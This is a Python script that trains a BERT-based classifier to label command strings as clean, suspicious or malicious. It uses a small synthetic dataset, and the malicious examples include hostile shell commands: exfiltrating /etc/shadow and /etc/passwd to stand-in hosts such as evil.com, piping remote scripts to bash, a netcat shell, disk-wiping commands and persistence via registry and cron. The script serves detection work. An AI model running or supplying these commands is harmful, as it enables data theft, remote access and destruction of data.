"""
Training script for Malware-BERT model
"""

import json
import torch
import torch.nn as nn
from torch.utils.data import Dataset, DataLoader
from transformers import BertTokenizer, AdamW, get_linear_schedule_with_warmup
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, confusion_matrix
import numpy as np
from malware_bert import MalwareBERT, ThreatLevel
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class MalwareDataset(Dataset):
    """Dataset for Malware-BERT training"""
    
    def __init__(self, texts, labels, tokenizer, max_length=512):
        self.texts = texts
        self.labels = labels
        self.tokenizer = tokenizer
        self.max_length = max_length
    
    def __len__(self):
        return len(self.texts)
    
    def __getitem__(self, idx):
        text = str(self.texts[idx])
        label = self.labels[idx]
        
        encoding = self.tokenizer(
            text,
            truncation=True,
            padding='max_length',
            max_length=self.max_length,
            return_tensors='pt'
        )
        
        return {
            'input_ids': encoding['input_ids'].flatten(),
            'attention_mask': encoding['attention_mask'].flatten(),
            'labels': torch.tensor(label, dtype=torch.long)
        }

def generate_training_data():
    """Generate synthetic training data for demonstration"""
    
    # Clean examples
    clean_examples = [
        "Hello world, this is a normal message",
        "The weather is nice today",
        "I love programming in Python",
        "This is a legitimate API call",
        "User authentication successful",
        "Database connection established",
        "File uploaded successfully",
        "Email sent to user@example.com",
        "Login attempt from 192.168.1.100",
        "System backup completed",
        "Configuration updated",
        "Log file created",
        "Memory usage: 45%",
        "CPU temperature: 65Â°C",
        "Network interface up",
        "Service started successfully",
        "User profile updated",
        "Password changed",
        "Session timeout in 30 minutes",
        "Backup verification passed"
    ]
    
    # Suspicious examples
    suspicious_examples = [
        "curl https://api.example.com/data",
        "wget http://example.com/file.zip",
        "base64 encoded string: SGVsbG8gV29ybGQ=",
        "hex encoded: 48656c6c6f20576f726c64",
        "https://bit.ly/short-link",
        "192.168.1.1:8080/api",
        "python -c 'print(\"hello\")'",
        "echo 'test' > file.txt",
        "ls -la /tmp",
        "cat /etc/passwd",
        "ps aux | grep python",
        "netstat -an | grep LISTEN",
        "df -h",
        "free -m",
        "top -n 1",
        "whoami",
        "pwd",
        "env | grep PATH",
        "history | tail -10",
        "find / -name '*.log' 2>/dev/null"
    ]
    
    # Malicious examples
    malicious_examples = [
        "rm -rf / && while true; do nc -l 4444; done",
        "curl https://evil.com --data \"$(cat /etc/passwd)\"",
        "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA7AA==",
        "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
        "bash -c 'curl http://attacker.com/shell.sh | bash'",
        "wget -O- http://malware.com/payload.sh | sh",
        "nc -l 4444 -e /bin/bash",
        "python -c 'import os; os.system(\"rm -rf /\")'",
        "while true; do curl http://c2.com/beacon; sleep 300; done",
        "echo 'malware' | base64 | curl -d @- http://evil.com",
        "powershell -Command \"Invoke-WebRequest -Uri http://evil.com/payload.ps1 -OutFile payload.ps1; .\\payload.ps1\"",
        "cmd /c \"echo off && for /f %i in ('dir /b') do del %i\"",
        "find / -type f -name '*.txt' -exec rm {} \\;",
        "dd if=/dev/zero of=/dev/sda bs=512 count=1",
        "format c: /q /y",
        "del /s /q c:\\*.*",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /t REG_SZ /d \"C:\\malware.exe\"",
        "schtasks /create /tn \"malware\" /tr \"C:\\malware.exe\" /sc onstart",
        "crontab -e && echo '*/5 * * * * curl http://evil.com/beacon' >> /tmp/cron",
        "while true; do curl -X POST http://c2.com/exfil -d \"$(cat /etc/shadow)\"; sleep 60; done"
    ]
    
    # Combine and label data
    texts = clean_examples + suspicious_examples + malicious_examples
    labels = [0] * len(clean_examples) + [1] * len(suspicious_examples) + [2] * len(malicious_examples)
    
    return texts, labels

def train_model(model, train_loader, val_loader, num_epochs=3, learning_rate=2e-5):
    """Train the Malware-BERT model"""
    
    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    model.to(device)
    
    optimizer = AdamW(model.parameters(), lr=learning_rate)
    
    # Calculate total training steps
    total_steps = len(train_loader) * num_epochs
    scheduler = get_linear_schedule_with_warmup(
        optimizer,
        num_warmup_steps=0,
        num_training_steps=total_steps
    )
    
    criterion = nn.CrossEntropyLoss()
    
    for epoch in range(num_epochs):
        model.train()
        total_loss = 0
        
        for batch in train_loader:
            input_ids = batch['input_ids'].to(device)
            attention_mask = batch['attention_mask'].to(device)
            labels = batch['labels'].to(device)
            
            optimizer.zero_grad()
            
            outputs = model(input_ids, attention_mask)
            loss = criterion(outputs, labels)
            
            loss.backward()
            optimizer.step()
            scheduler.step()
            
            total_loss += loss.item()
        
        avg_loss = total_loss / len(train_loader)
        logger.info(f"Epoch {epoch + 1}/{num_epochs}, Average Loss: {avg_loss:.4f}")
        
        # Validation
        model.eval()
        val_loss = 0
        val_predictions = []
        val_labels = []
        
        with torch.no_grad():
            for batch in val_loader:
                input_ids = batch['input_ids'].to(device)
                attention_mask = batch['attention_mask'].to(device)
                labels = batch['labels'].to(device)
                
                outputs = model(input_ids, attention_mask)
                loss = criterion(outputs, labels)
                val_loss += loss.item()
                
                predictions = torch.argmax(outputs, dim=-1)
                val_predictions.extend(predictions.cpu().numpy())
                val_labels.extend(labels.cpu().numpy())
        
        avg_val_loss = val_loss / len(val_loader)
        accuracy = np.mean(np.array(val_predictions) == np.array(val_labels))
        
        logger.info(f"Validation Loss: {avg_val_loss:.4f}, Accuracy: {accuracy:.4f}")
    
    return model

def evaluate_model(model, test_loader):
    """Evaluate the trained model"""
    
    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    model.to(device)
    model.eval()
    
    all_predictions = []
    all_labels = []
    
    with torch.no_grad():
        for batch in test_loader:
            input_ids = batch['input_ids'].to(device)
            attention_mask = batch['attention_mask'].to(device)
            labels = batch['labels'].to(device)
            
            outputs = model(input_ids, attention_mask)
            predictions = torch.argmax(outputs, dim=-1)
            
            all_predictions.extend(predictions.cpu().numpy())
            all_labels.extend(labels.cpu().numpy())
    
    # Print classification report
    target_names = ['clean', 'suspicious', 'malicious']
    print("\nClassification Report:")
    print(classification_report(all_labels, all_predictions, target_names=target_names))
    
    # Print confusion matrix
    print("\nConfusion Matrix:")
    print(confusion_matrix(all_labels, all_predictions))
    
    return all_predictions, all_labels

def main():
    """Main training function"""
    
    logger.info("Generating training data...")
    texts, labels = generate_training_data()
    
    logger.info(f"Generated {len(texts)} training examples")
    logger.info(f"Clean: {labels.count(0)}, Suspicious: {labels.count(1)}, Malicious: {labels.count(2)}")
    
    # Split data
    train_texts, test_texts, train_labels, test_labels = train_test_split(
        texts, labels, test_size=0.2, random_state=42, stratify=labels
    )
    
    train_texts, val_texts, train_labels, val_labels = train_test_split(
        train_texts, train_labels, test_size=0.2, random_state=42, stratify=train_labels
    )
    
    # Initialize tokenizer and model
    tokenizer = BertTokenizer.from_pretrained('bert-base-uncased')
    model = MalwareBERT(num_labels=3)
    
    # Create datasets
    train_dataset = MalwareDataset(train_texts, train_labels, tokenizer)
    val_dataset = MalwareDataset(val_texts, val_labels, tokenizer)
    test_dataset = MalwareDataset(test_texts, test_labels, tokenizer)
    
    # Create data loaders
    train_loader = DataLoader(train_dataset, batch_size=8, shuffle=True)
    val_loader = DataLoader(val_dataset, batch_size=8, shuffle=False)
    test_loader = DataLoader(test_dataset, batch_size=8, shuffle=False)
    
    logger.info("Starting training...")
    trained_model = train_model(model, train_loader, val_loader, num_epochs=3)
    
    logger.info("Evaluating model...")
    predictions, labels = evaluate_model(trained_model, test_loader)
    
    # Save the trained model
    model_path = "malware_bert_model.pth"
    torch.save(trained_model.state_dict(), model_path)
    logger.info(f"Model saved to {model_path}")
    
    # Save training data for reference
    training_data = {
        'texts': texts,
        'labels': labels,
        'label_map': {0: 'clean', 1: 'suspicious', 2: 'malicious'}
    }
    
    with open('training_data.json', 'w') as f:
        json.dump(training_data, f, indent=2)
    
    logger.info("Training completed!")

if __name__ == "__main__":
    main()
